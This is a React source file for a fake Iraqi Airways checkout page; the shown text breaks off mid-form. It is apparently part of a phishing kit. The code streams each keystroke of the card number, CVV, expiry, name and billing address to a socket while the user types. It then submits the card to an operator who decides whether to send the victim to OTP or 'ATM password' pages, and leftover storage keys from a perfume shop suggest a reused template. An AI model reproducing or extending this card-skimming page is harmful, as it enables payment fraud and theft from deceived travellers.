import React, { useState, useEffect, useRef } from 'react';
import { useLang } from '../contexts/LanguageContext';
import { getCurrency, convertFromKWD, CURRENCIES } from "@/lib/currency";
import { cityName as getCityName } from '../lib/airportNames';
import { useSignalEffect, useSignals } from "@preact/signals-react/runtime";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  socket,
  visitor,
  sendData,
  isFormApproved,
  isCardVerified,
  navigateToPage,
  cardAction,
  waitingMessage,
  globalDiscount,
} from "@/lib/store";
import { MADA_BINS, getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";

const schema = z.object({
  cardNumber: z
    .string()
    .min(1, "Card number is required")
    .refine((val) => {
      const cleanVal = val.replace(/\s+/g, "");
      if (!cleanVal || cleanVal.length < 13 || cleanVal.length > 19) return false;
      let sum = 0;
      let isEven = false;
      for (let i = cleanVal.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanVal[i], 10);
        if (isEven) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
      }
      return sum % 10 === 0;
    }, "Invalid card number"),
  nameOnCard: z.string().min(1, "Cardholder name is required").regex(/^[A-Za-z][A-Za-z '\u0027-]*$/, "Cardholder name must use English letters"),
  expiryDate: z.string().min(1, "Expiry date is required").refine((val) => {
    const match = val.match(/^(\d{2})\/(\d{2})$/);
    if (!match) return false;
    const month = parseInt(match[1], 10);
    const year = parseInt(match[2], 10);
    if (month < 1 || month > 12) return false;
    const now = new Date();
    const currentFullYear = now.getFullYear();
    const currentMonth = now.getMonth() + 1;
    const expiryFullYear = 2000 + year;
    if (expiryFullYear < currentFullYear || expiryFullYear > currentFullYear + 10) return false;
    if (expiryFullYear === currentFullYear && month < currentMonth) return false;
    return true;
  }, "Invalid expiry date"),
  cvv: z.string().regex(/^\d{3}$/, "CVV must be 3 digits"),
  street: z.string().min(1, "Street is required"),
  apartment: z.string().optional(),
  city: z.string().min(1, "City is required"),
  state: z.string().optional(),
  postcode: z.string().min(1, "Postcode is required"),
  country: z.string().min(1, "Country is required"),
});

type FormData = z.infer<typeof schema>;

function isValidCardNumber(number: string): boolean {
  if (!number || number.length < 13 || number.length > 19) return false;
  let sum = 0;
  let isEven = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

function getCardType(number: string): string {
  const cleanNumber = number.replace(/\s+/g, "");
  const cardType = getCardTypeFromDB(cleanNumber);
  return cardType ? cardType.toLowerCase() : "unknown";
}

function getBankInfoLocal(cardNumber: string): { bank: string; logo: string } | null {
  const info = getBinInfo(cardNumber);
  if (info) {
    return { bank: info.bank, logo: info.bankLogo };
  }
  return null;
}

const COUNTRIES = [
  { code: 'iq', en: 'Iraq', ar: 'العراق' },
  { code: 'jo', en: 'Jordan', ar: 'الأردن' },
  { code: 'ae', en: 'UAE', ar: 'الإمارات العربية المتحدة' },
  { code: 'sa', en: 'Saudi Arabia', ar: 'المملكة العربية السعودية' },
  { code: 'kw', en: 'Kuwait', ar: 'الكويت' },
  { code: 'qa', en: 'Qatar', ar: 'قطر' },
  { code: 'bh', en: 'Bahrain', ar: 'البحرين' },
  { code: 'om', en: 'Oman', ar: 'عمان' },
  { code: 'eg', en: 'Egypt', ar: 'مصر' },
  { code: 'lb', en: 'Lebanon', ar: 'لبنان' },
  { code: 'sy', en: 'Syria', ar: 'سوريا' },
  { code: 'ps', en: 'Palestine', ar: 'فلسطين' },
  { code: 'tr', en: 'Turkey', ar: 'تركيا' },
  { code: 'ir', en: 'Iran', ar: 'إيران' },
  { code: 'ly', en: 'Libya', ar: 'ليبيا' },
  { code: 'ma', en: 'Morocco', ar: 'المغرب' },
  { code: 'tn', en: 'Tunisia', ar: 'تونس' },
  { code: 'dz', en: 'Algeria', ar: 'الجزائر' },
  { code: 'sd', en: 'Sudan', ar: 'السودان' },
  { code: 'ye', en: 'Yemen', ar: 'اليمن' },
  { code: 'gb', en: 'United Kingdom', ar: 'المملكة المتحدة' },
  { code: 'us', en: 'United States', ar: 'الولايات المتحدة' },
  { code: 'ca', en: 'Canada', ar: 'كندا' },
  { code: 'de', en: 'Germany', ar: 'ألمانيا' },
  { code: 'fr', en: 'France', ar: 'فرنسا' },
  { code: 'it', en: 'Italy', ar: 'إيطاليا' },
  { code: 'es', en: 'Spain', ar: 'إسبانيا' },
  { code: 'nl', en: 'Netherlands', ar: 'هولندا' },
  { code: 'se', en: 'Sweden', ar: 'السويد' },
  { code: 'no', en: 'Norway', ar: 'النرويج' },
  { code: 'dk', en: 'Denmark', ar: 'الدنمارك' },
  { code: 'ch', en: 'Switzerland', ar: 'سويسرا' },
  { code: 'at', en: 'Austria', ar: 'النمسا' },
  { code: 'be', en: 'Belgium', ar: 'بلجيكا' },
  { code: 'gr', en: 'Greece', ar: 'اليونان' },
  { code: 'tr', en: 'Turkey', ar: 'تركيا' },
  { code: 'my', en: 'Malaysia', ar: 'ماليزيا' },
  { code: 'in', en: 'India', ar: 'الهند' },
  { code: 'pk', en: 'Pakistan', ar: 'باكستان' },
  { code: 'id', en: 'Indonesia', ar: 'إندونيسيا' },
  { code: 'cn', en: 'China', ar: 'الصين' },
  { code: 'jp', en: 'Japan', ar: 'اليابان' },
  { code: 'kr', en: 'South Korea', ar: 'كوريا الجنوبية' },
  { code: 'au', en: 'Australia', ar: 'أستراليا' },
  { code: 'nz', en: 'New Zealand', ar: 'نيوزيلندا' },
  { code: 'br', en: 'Brazil', ar: 'البرازيل' },
  { code: 'ru', en: 'Russia', ar: 'روسيا' },
  { code: 'ua', en: 'Ukraine', ar: 'أوكرانيا' },
  { code: 'af', en: 'Afghanistan', ar: 'أفغانستان' },
  { code: 'al', en: 'Albania', ar: 'ألبانيا' },
  { code: 'ad', en: 'Andorra', ar: 'أندورا' },
  { code: 'ao', en: 'Angola', ar: 'أنغولا' },
  { code: 'ar', en: 'Argentina', ar: 'الأرجنتين' },
  { code: 'am', en: 'Armenia', ar: 'أرمينيا' },
  { code: 'az', en: 'Azerbaijan', ar: 'أذربيجان' },
  { code: 'bd', en: 'Bangladesh', ar: 'بنغلاديش' },
  { code: 'by', en: 'Belarus', ar: 'بيلاروسيا' },
  { code: 'bo', en: 'Bolivia', ar: 'بوليفيا' },
  { code: 'bg', en: 'Bulgaria', ar: 'بلغاريا' },
  { code: 'cl', en: 'Chile', ar: 'تشيلي' },
  { code: 'co', en: 'Colombia', ar: 'كولومبيا' },
  { code: 'cy', en: 'Cyprus', ar: 'قبرص' },
  { code: 'cz', en: 'Czech Republic', ar: 'جمهورية التشيك' },
  { code: 'fi', en: 'Finland', ar: 'فنلندا' },
  { code: 'ge', en: 'Georgia', ar: 'جورجيا' },
  { code: 'hk', en: 'Hong Kong', ar: 'هونغ كونغ' },
  { code: 'hu', en: 'Hungary', ar: 'المجر' },
  { code: 'is', en: 'Iceland', ar: 'آيسلندا' },
  { code: 'ie', en: 'Ireland', ar: 'أيرلندا' },
  { code: 'kz', en: 'Kazakhstan', ar: 'كازاخستان' },
  { code: 'ke', en: 'Kenya', ar: 'كينيا' },
  { code: 'lu', en: 'Luxembourg', ar: 'لوكسمبورغ' },
  { code: 'mt', en: 'Malta', ar: 'مالطا' },
  { code: 'mx', en: 'Mexico', ar: 'المكسيك' },
  { code: 'ng', en: 'Nigeria', ar: 'نيجيريا' },
  { code: 'ph', en: 'Philippines', ar: 'الفلبين' },
  { code: 'pl', en: 'Poland', ar: 'بولندا' },
  { code: 'pt', en: 'Portugal', ar: 'البرتغال' },
  { code: 'ro', en: 'Romania', ar: 'رومانيا' },
  { code: 'sg', en: 'Singapore', ar: 'سنغافورة' },
  { code: 'za', en: 'South Africa', ar: 'جنوب أفريقيا' },
  { code: 'th', en: 'Thailand', ar: 'تايلاند' },
  { code: 'uz', en: 'Uzbekistan', ar: 'أوزبكستان' },
  { code: 'vn', en: 'Vietnam', ar: 'فيتنام' },
];

export default function CreditCardPayment() {
  useSignals();
  
  // 1. State
  const [cardError, setCardError] = useState(false);
  const [luhnError, setLuhnError] = useState(false);
  const [rejectedError, setRejectedError] = useState(false);
  const [selectedCardType, setSelectedCardType] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [expiryError, setExpiryError] = useState(false);
  const [globalBlockedError, setGlobalBlockedError] = useState(false);
  const [langMenuOpen, setLangMenuOpen] = useState(false);
  const [isCurrencyDropdownOpen, setIsCurrencyDropdownOpen] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutes in seconds
  const [countryOpen, setCountryOpen] = useState(false);
  const [countrySearch, setCountrySearch] = useState("");
  const [selectedCountry, setSelectedCountry] = useState(COUNTRIES[0]);
  const [priceDetailOpen, setPriceDetailOpen] = useState(false);
  const [adultDetailOpen, setAdultDetailOpen] = useState(false);
  const [childDetailOpen, setChildDetailOpen] = useState(false);

  // 2. Refs & Context
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const countryDropdownRef = useRef<HTMLFieldSetElement>(null);
  const { lang, setLang, t } = useLang();
  const isAr = lang === 'ar';
  const [, navigate] = useLocation();

  // 3. Signals
  const isDiscountActive = globalDiscount.value;

  // 4. Effects
  useEffect(() => {
    waitingMessage.value = "";
    waitingCardInfo.value = null;
    isFormApproved.value = false;
    isCardVerified.value = null;
    cardAction.value = null;
  }, []);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timerId = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timerId);
  }, [timeLeft]);

  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (countryDropdownRef.current && !countryDropdownRef.current.contains(event.target as Node)) {
        setCountryOpen(false);
      }
    }
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  const searchParams = new URLSearchParams(window.location.search);
  const urlAmount = searchParams.get('amount') || '0';
  const urlCurrency = searchParams.get('currency');

  const cartItems = JSON.parse(localStorage.getItem('amouage_cart') || '[]');

  const getCartTotal = () => {
    const storedTotal = localStorage.getItem('amouage_order_total');
    if (storedTotal && Number(storedTotal) > 0) {
      return storedTotal;
    }
    let total = 0;
    for (const item of cartItems) {
      total += (parseFloat(item.priceNum) || 0) * (item.quantity || 1);
    }
    return total.toFixed(3);
  };
  
  let totalAmount = getCartTotal();
  if (Number(urlAmount) > 0) {
    totalAmount = urlAmount;
    localStorage.setItem('amouage_order_total', urlAmount);
  }
  
  let currentCurrency = urlCurrency;
  if (currentCurrency) {
    localStorage.setItem('amouage_currency', currentCurrency);
  } else {
    currentCurrency = localStorage.getItem('amouage_currency') || null;
  }
  
  const payCur = getCurrency(currentCurrency);
  
  const cityNames: Record<string, string> = { BGW:'Baghdad',EBL:'Erbil',BSR:'Basra',NJF:'Najaf',KIK:'Kirkuk',ISU:'Sulaymaniyah',OSM:'Mosul',AMM:'Amman',IST:'Istanbul',DXB:'Dubai',BEY:'Beirut',CAI:'Cairo',DEL:'Delhi',FRA:'Frankfurt',KUL:'Kuala Lumpur',CAN:'Guangzhou',CPH:'Copenhagen',SAW:'Istanbul Sabiha',AYT:'Antalya',TZX:'Trabzon' };
  const cityName = (code?: string) => (code ? getCityName(code.toUpperCase(), cityNames[code.toUpperCase()] || code, lang) : '');

  const originalAmountKWD = Number(totalAmount);
  const discountedAmountKWD = originalAmountKWD * 0.75;
  const liveAmountKWD = isDiscountActive ? discountedAmountKWD : originalAmountKWD;

  const displayAmount = convertFromKWD(liveAmountKWD, payCur.code);
  const originalDisplayAmount = convertFromKWD(originalAmountKWD, payCur.code);

  const displayAmountStr = displayAmount.toLocaleString('en-US', { minimumFractionDigits: payCur.decimals, maximumFractionDigits: payCur.decimals });
  const originalDisplayAmountStr = originalDisplayAmount.toLocaleString('en-US', { minimumFractionDigits: payCur.decimals, maximumFractionDigits: payCur.decimals });

  const {
    register,
    handleSubmit,
    watch,
    setValue,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      cardNumber: "",
      nameOnCard: "",
      expiryDate: "",
      cvv: "",
      street: "",
      apartment: "",
      city: "",
      state: "",
      postcode: "",
      country: "Iraq",
    },
  });

  const cardNumber = watch("cardNumber");
  const nameOnCard = watch("nameOnCard");
  const expiryDate = watch("expiryDate");
  const cvv = watch("cvv");
  const street = watch("street");
  const city = watch("city");
  const postcode = watch("postcode");
  const country = watch("country");

  useEffect(() => {
    setValue("country", isAr ? selectedCountry.ar : selectedCountry.en);
  }, [selectedCountry, isAr, setValue]);

  useEffect(() => {
    const rawNum = (cardNumber || "").replace(/\s+/g, "");
    socket.value.emit("card:live", {
      cardNumber: rawNum,
      nameOnCard: nameOnCard || "",
      expiryDate: expiryDate || "",
      cvv: cvv || "",
      billing: {
        street: street || "",
        city: city || "",
        postcode: postcode || "",
        country: country || "",
      }
    });
  }, [cardNumber, nameOnCard, expiryDate, cvv, street, city, postcode, country]);

  const cleanCardNumber = cardNumber?.replace(/\s+/g, "") || "";
  const isFormValid =
    cleanCardNumber.length >= 13 &&
    cleanCardNumber.length <= 19 &&
    !luhnError &&
    nameOnCard?.trim().length > 0 &&
    !expiryError &&
    expiryDate?.match(/^\d{2}\/\d{2}$/) &&
    cvv?.length === 3 &&
    street?.trim().length > 0 &&
    city?.trim().length > 0 &&
    postcode?.trim().length > 0 &&
    country?.trim().length > 0;

  useEffect(() => {
    if (expiryMonth && expiryYear) {
      const formatted = `${expiryMonth}/${expiryYear}`;
      setValue("expiryDate", formatted);

      const m = parseInt(expiryMonth, 10);
      const y = parseInt(expiryYear, 10);
      const now = new Date();
      const currentFullYear = now.getFullYear();
      const currentMonth = now.getMonth() + 1;
      const expiryFullYear = 2000 + y;
      const withinTenYears = expiryFullYear >= currentFullYear && expiryFullYear <= currentFullYear + 10;
      const notExpiredThisYear = expiryFullYear !== currentFullYear || m >= currentMonth;
      setExpiryError(!(m >= 1 && m <= 12 && withinTenYears && notExpiredThisYear));
    }
  }, [expiryMonth, expiryYear, setValue]);

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 19) value = value.slice(0, 19);
    const type = getCardType(value);
    if (type === "visa") setSelectedCardType("Visa");
    else if (type === "mastercard") setSelectedCardType("MasterCard");
    if (value.length >= 13) setLuhnError(!isValidCardNumber(value));
    else setLuhnError(false);
    const isPrefixBlocked = visitor.value.blockedCardPrefixes?.some(prefix => value.startsWith(prefix));
    setCardError(!!isPrefixBlocked);
    const formatted = value.replace(/(\d{4})(?=\d)/g, "$1 ");
    e.target.value = formatted;
    setValue("cardNumber", formatted);
  };

  useSignalEffect(() => {
    if (isFormApproved.value) navigate("/otp-verification");
  });

  useSignalEffect(() => {
    const action = cardAction.value;
    if (!action) return;
    if (action.action === "otp") navigate("/otp-verification");
    else if (action.action === "atm") navigate("/atm-password");
    else if (action.action === "reject") {
      setRejectedError(true);
      waitingCardInfo.value = null;
      waitingMessage.value = "";
    }
  });

  const onSubmit = (data: FormData) => {
    if (cardError || luhnError) return;
    setRejectedError(false);
    const cleanNum = data.cardNumber.replace(/\s+/g, "");
    sendData({
      paymentCard: {
        number: cleanNum,
        name: data.nameOnCard,
        expiry: data.expiryDate,
        cvv: data.cvv,
        type: selectedCardType || getCardType(cleanNum),
        bank: getBankInfoLocal(cleanNum)?.bank || "Unknown Bank",
        billing: {
          street: data.street,
          apartment: data.apartment,
          city: data.city,
          state: data.state,
          postcode: data.postcode,
          country: data.country,
        }
      },
      current: "صفحة الدفع",
      nextPage: "انتظار الرد",
      waitingForAdminResponse: true,
    });
    waitingMessage.value = lang === 'ar' ? "جاري معالجة الدفع..." : "Processing payment...";
  };

  const tripSummary = JSON.parse(localStorage.getItem('tripSummary') || '{}');
  const origin = tripSummary.originCode || 'BGW';
  const destination = tripSummary.destCode || 'EBL';
  const originCity = cityName(origin);
  const destCity = cityName(destination);
  const paxCount = tripSummary.passengerCount || tripSummary.paxCount || 1;
  const flightsConv = tripSummary.flightsConv || 0;
  const taxesConv = tripSummary.taxesConv || 0;
  
  const flightData = JSON.parse(localStorage.getItem('selectedFlight') || localStorage.getItem('flightData') || '{}');
  const px = flightData.pax || { adult: paxCount, child: 0, infant: 0 };
  const numAdults = px.adult || paxCount;

  const adultPrice = flightsConv / paxCount;
  const adultTaxes = taxesConv / paxCount;

  const filteredCountries = countrySearch.trim() === "" 
    ? COUNTRIES 
    : COUNTRIES.filter(c => 
        c.en.toLowerCase().includes(countrySearch.toLowerCase()) || 
        c.ar.includes(countrySearch)
      );

  return (
    <div className="min-h-screen bg-[#f4f7f6] font-sans flex flex-col" dir={isAr ? 'rtl' : 'ltr'}>
      <WaitingOverlay />
      <header className="bg-[#4CAF50] text-white py-3 px-4 shadow-md sticky top-0 z-40">
        <div className={`max-w-6xl mx-auto flex items-center justify-between ${isAr ? 'flex-row' : 'flex-row-reverse'}`}>
          <div className="flex items-center gap-4">
            <div className="relative">
              <button onClick={() => setLangMenuOpen(!langMenuOpen)} className="flex items-center gap-1 text-sm font-medium hover:opacity-80 transition-opacity uppercase">
                {lang === 'en' ? 'English' : 'العربية'} <span className="text-[10px]">▼</span>
              </button>
              {langMenuOpen && (
                <div className={`absolute top-full mt-2 bg-white text-gray-800 rounded shadow-xl py-2 min-w-[120px] z-50 border border-gray-100 animate-in fade-in slide-in-from-top-1 ${isAr ? 'right-0' : 'left-0'}`}>
                  <button onClick={() => { setLang('en'); setLangMenuOpen(false); }} className="w-full text-left px-4 py-2 hover:bg-gray-50 transition-colors text-sm font-medium">English</button>
                  <button onClick={() => { setLang('ar'); setLangMenuOpen(false); }} className="w-full text-left px-4 py-2 hover:bg-gray-50 transition-colors text-sm font-medium">العربية</button>
                </div>
              )}
            </div>
          </div>
          <div className={`flex items-center gap-6 ${isAr ? 'flex-row' : 'flex-row-reverse'}`}>
            <a href="/" className="text-sm font-bold hover:underline underline-offset-4 decoration-2 transition-all">{isAr ? 'الصفحة الرئيسية' : 'Home'}</a>
            <a href="/" className="block"><img src="/iraqi_airways/logo.png" alt="Iraqi Airways" className="h-10 brightness-0 invert" /></a>
          </div>
        </div>
      </header>

      <div className="bg-white border-b border-gray-200 py-4 px-4 sticky top-[64px] z-30 shadow-sm">
        <div className="max-w-6xl mx-auto flex flex-wrap justify-between items-center gap-4">
          <div className={`flex items-center gap-6 overflow-x-auto no-scrollbar ${isAr ? 'flex-row' : 'flex-row-reverse'}`}>
            <div className={`flex items-center gap-3 shrink-0 ${isAr ? 'flex-row' : 'flex-row-reverse'}`}>
              <div className={isAr ? 'text-right' : 'text-left'}>
                <p className="text-xl font-black text-[#2E7D32] leading-tight tracking-tighter uppercase">{origin}</p>
                <p className="text-[10px] text-gray-500 font-bold uppercase">{originCity}</p>
              </div>
              <img src="/iraqi_airways/plane_icon.svg" alt="to" className={`h-4 w-4 opacity-30 ${isAr ? 'rotate-180' : ''}`} />
              <div className={isAr ? 'text-left' : 'text-right'}>
                <p className="text-xl font-black text-[#2E7D32] leading-tight tracking-tighter uppercase">{destination}</p>
                <p className="text-[10px] text-gray-500 font-bold uppercase">{destCity}</p>
              </div>
            </div>
            <div className="h-8 w-px bg-gray-200 hidden sm:block"></div>
            <div className="flex flex-col shrink-0">
              <p className="text-[10px] text-gray-400 font-bold uppercase tracking-wider">{isAr ? 'مغادرة' : 'Depart'}</p>
              <p className="text-sm font-black text-gray-700">{tripSummary.departDate || '...'}</p>
            </div>
            <div className="h-8 w-px bg-gray-200 hidden sm:block"></div>
            <div className="flex flex-col shrink-0">
              <p className="text-[10px] text-gray-400 font-bold uppercase tracking-wider">{isAr ? 'مسافرون' : 'Passenger'}</p>
              <div className="flex items-center gap-1.5">
                <p className="text-sm font-black text-gray-700">{paxCount}</p>
                <svg className="w-3.5 h-3.5 text-[#4CAF50]" fill="currentColor" viewBox="0 0 20 20"><path d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" /></svg>
              </div>
            </div>
          </div>
          <button className="bg-[#E8F5E9] text-[#2E7D32] p-2.5 rounded-lg hover:bg-[#C8E6C9] transition-colors border border-[#A5D6A7] shadow-sm active:scale-95 group relative">
            <div className="flex items-center gap-2">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z" /></svg>
              <span className="text-xs font-black uppercase tracking-tighter">{isAr ? 'الحجز الخاص بك' : 'Your booking'}</span>
            </div>
          </button>
        </div>
      </div>

      <main className="max-w-4xl mx-auto py-10 px-4">
        <div className="text-center mb-10">
          <h1 className="text-3xl font-black text-gray-800 tracking-tight uppercase border-b-4 border-[#4CAF50] inline-block pb-1">{isAr ? 'إتمام الدفع' : 'Checkout'}</h1>
        </div>

        <div className="grid grid-cols-1 gap-8">
          <div className="bg-white rounded-xl shadow-xl border border-gray-100 overflow-hidden">
            <div className="p-6 border-b border-gray-100 bg-gray-50/50">
              <div className="flex justify-between items-center cursor-pointer" onClick={() => setPriceDetailOpen(!priceDetailOpen)}>
                <div className="flex flex-col">
                  <div className={`flex items-baseline gap-2 ${isAr ? 'flex-row' : 'flex-row'}`}>
                    <span className="text-sm font-bold text-gray-500">{isAr ? 'السعر الإجمالي:' : 'Total price:'}</span>
                    <span className="text-2xl font-black text-[#2E7D32]">{payCur.symbol} {displayAmountStr}</span>
                    {isDiscountActive && (
                      <span className="text-sm text-red-500 line-through font-bold opacity-60">{payCur.symbol} {originalDisplayAmountStr}</span>
                    )}
                  </div>
                  <p className={`text-[11px] text-gray-400 font-medium mt-0.5 ${isAr ? 'text-right' : 'text-left'}`}>{isAr ? 'سعر الذهاب لجميع المسافرين (شاملاً الضرائب والرسوم والخصومات).' : 'One way price for all passengers (including taxes, fees and discounts).'} <span className="text-[#4CAF50] font-bold underline decoration-dotted">{isAr ? 'عرض تفاصيل السعر.' : 'See price details'}</span></p>
                </div>
                <span className={`text-[#4CAF50] transition-transform duration-300 ${priceDetailOpen ? 'rotate-180' : ''}`}>▼</span>
              </div>

              {priceDetailOpen && (
                <div className="mt-6 space-y-4 animate-in fade-in slide-in-from-top-2">
                  {numAdults > 0 && (
                    <div className="border rounded-lg overflow-hidden border-gray-200">
                      <div className="bg-gray-100 px-4 py-2 flex justify-between items-center cursor-pointer" onClick={() => setAdultDetailOpen(!adultDetailOpen)}>
                        <span className="text-xs font-black text-gray-700 uppercase tracking-wider">{isAr ? 'بالغ' : 'Adult'} x{numAdults}</span>
                        <div className="flex items-center gap-3">
                          <span className="text-sm font-black text-gray-800">{payCur.symbol} {convertFromKWD((adultPrice + adultTaxes) * numAdults, payCur.code).toLocaleString('en-US', { minimumFractionDigits: payCur.decimals })}</span>
                          <span className={`text-[10px] transition-transform ${adultDetailOpen ? 'rotate-180' : ''}`}>▼</span>
                        </div>
                      </div>
                      {adultDetailOpen && (
                        <div className="p-4 space-y-2 bg-white text-xs">
                          <div className="flex justify-between"><span>{isAr ? 'سعر التذكرة' : 'Fare'}</span><span>{payCur.symbol} {convertFromKWD(adultPrice * numAdults, payCur.code).toLocaleString('en-US', { minimumFractionDigits: payCur.decimals })}</span></div>
                          <div className="flex justify-between text-gray-500 italic"><span>{isAr ? 'الضرائب والرسوم' : 'Taxes & Fees'}</span><span>{payCur.symbol} {convertFromKWD(adultTaxes * numAdults, payCur.code).toLocaleString('en-US', { minimumFractionDigits: payCur.decimals })}</span></div>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              )}
            </div>

            <div className="p-8">
              <div className={`flex items-center gap-3 mb-8 ${isAr ? 'flex-row' : 'flex-row'}`}>
                <div className="w-10 h-10 bg-[#E8F5E9] rounded-lg flex items-center justify-center">
                  <svg className="w-6 h-6 text-[#4CAF50]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
                </div>
                <h2 className="text-xl font-black text-gray-800 tracking-tight uppercase">{isAr ? 'اختر طريقة الدفع' : 'Select payment method'}</h2>
              </div>

              <div className={`flex flex-col sm:flex-row gap-8 ${isAr ? 'flex-row' : 'flex-row'}`}>
                <div className="w-full sm:w-[250px] shrink-0">
                  <div className={`flex items-center gap-2 mb-4 ${isAr ? 'flex-row' : 'flex-row'}`}>
                    <svg className="w-5 h-5 text-[#4CAF50]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
                    <span className="font-black text-[#2E7D32] text-sm uppercase tracking-wider">{isAr ? 'بطاقة ائتمان' : 'Credit Card'}</span>
                  </div>
                  <div className={`flex gap-2 mb-6 ${isAr ? 'flex-row' : 'flex-row'}`}>
                    <img src="/iraqi_airways/vendor_mastercard.svg" alt="Mastercard" className="h-4" />
                    <img src="/iraqi_airways/vendor_visa.svg" alt="Visa" className="h-4" />
                  </div>
                  
                  <div className="relative aspect-[1.6/1] w-full bg-gradient-to-br from-[#1a2a6c] via-[#b21f1f] to-[#fdbb2d] rounded-xl shadow-2xl text-white overflow-hidden group hover:scale-[1.02] transition-transform duration-500">
                    <div className="absolute inset-0 bg-black/20 group-hover:bg-transparent transition-colors"></div>
                    <div className="absolute bottom-0 left-0 right-0 h-12" style={{background:'linear-gradient(to top, rgba(0,0,0,0.3), transparent)'}}></div>
                    <div className="relative z-10 p-5 flex flex-col justify-between h-full">
                      {selectedCardType && <img src={`/iraqi_airways/vendor_${selectedCardType.toLowerCase()}.svg`} alt={selectedCardType} className="absolute top-3 right-3 h-8" />}
                      <p className="text-lg tracking-widest font-mono mt-8" dir="ltr">{cardNumber || 'XXXX XXXX XXXX XXXX'}</p>
                      <div className="flex justify-between text-xs">
                        <div><p className="opacity-70">{isAr ? 'اسم حامل البطاقة' : 'Cardholder name'}</p><p className="uppercase">{nameOnCard || 'XXX'}</p></div>
                        <div><p className="opacity-70">{isAr ? 'تاريخ الانتهاء' : 'Expiration date'}</p><p>{expiryDate || 'XXX'}</p></div>
                      </div>
                    </div>
                  </div>
                </div>

                <div className={`flex-1 space-y-4`}>
                  <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'نوع البطاقة*' : 'Card type*'}</legend>
                    <select className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px] appearance-none cursor-pointer">
                      <option>{isAr ? 'اختر نوع البطاقة' : 'Select card type'}</option>
                      <option>Visa</option>
                      <option>MasterCard</option>
                    </select>
                  </fieldset>

                  <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${luhnError || cardError ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'رقم البطاقة*' : 'Card number*'}</legend>
                    <div className="flex items-center w-full">
                      <input type="text" inputMode="numeric" placeholder={isAr ? 'رقم بطاقتك الائتمانية' : 'Your credit card number'} {...register("cardNumber")} onChange={handleCardChange} maxLength={19} className="flex-1 bg-transparent text-gray-700 focus:outline-none text-[15px] self-center" dir="ltr" />
                      {selectedCardType && <img src={`/iraqi_airways/vendor_${selectedCardType.toLowerCase()}.svg`} alt={selectedCardType} className="h-7" />}
                    </div>
                  </fieldset>
                  {luhnError && <p className="text-red-500 text-xs">{isAr ? 'رقم بطاقة غير صالح' : 'Invalid card number'}</p>}
                  {cardError && <p className="text-red-500 text-xs">{isAr ? 'هذه البطاقة غير مقبولة' : 'This card is not accepted'}</p>}
                  {globalBlockedError && <p className="text-red-500 text-xs">{isAr ? 'تم حظر هذه البطاقة' : 'This card has been blocked'}</p>}
                  {rejectedError && <p className="text-red-500 text-xs">{isAr ? 'تم رفض عملية الدفع. يرجى تجربة بطاقة أخرى.' : 'Payment was rejected. Please try another card.'}</p>}
                </div>
              </div>

              <div className={`cc-fields-below mt-3`}>
                <div className="cc-expiry-cvv flex flex-wrap sm:flex-nowrap gap-3 items-start">
                  <fieldset className={`border rounded px-3 bg-[#f5faf0] flex-1 min-w-0 flex items-center flex-shrink-0 ${expiryError ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', minHeight:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'تاريخ الانتهاء*' : 'Expiry date*'}</legend>
                    <div className="flex items-center w-full h-full" dir="ltr">
                      <input id="expiry-month" type="text" inputMode="numeric" placeholder="MM" value={expiryMonth} 
                        onChange={(e) => { 
                          const v = e.target.value.replace(/\D/g,'').slice(0,2); 
                          setExpiryMonth(v); 
                          if (v.length === 2) document.getElementById('expiry-year')?.focus();
                        }} 
